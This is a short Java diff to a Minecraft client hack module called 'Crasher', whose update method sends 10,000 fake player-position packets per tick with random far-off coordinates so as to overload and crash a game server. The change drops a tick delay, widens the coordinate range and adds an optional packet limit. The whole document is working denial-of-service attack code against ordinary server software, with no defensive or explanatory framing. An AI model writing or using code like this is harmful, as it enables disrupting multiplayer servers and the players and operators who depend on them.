@@ -29,16 +29,12 @@ public class Crasher extends Module {
 	}
 	
 	public void onUpdate() {
-		++this.loop;
-		if (this.loop > 6) {
-			int spam = 0;
-			while (spam < 10000) {
-				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*30000+5000), (Math.random()*100+10), (Math.random()*30000+5000), true));
-				++spam;
-				this.loop = 0;
-			}
-			super.onUpdate();
+		int spam = 0;
+		while (spam < 10000 && (Utils.limite ? Utils.limit > Utils.nbPack : true)) {
+			mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*1000000-500000), (Math.random()*100+10), (Math.random()*1000000-500000), true));
+			++spam;
 		}
+		super.onUpdate();
 	}
 	
 }
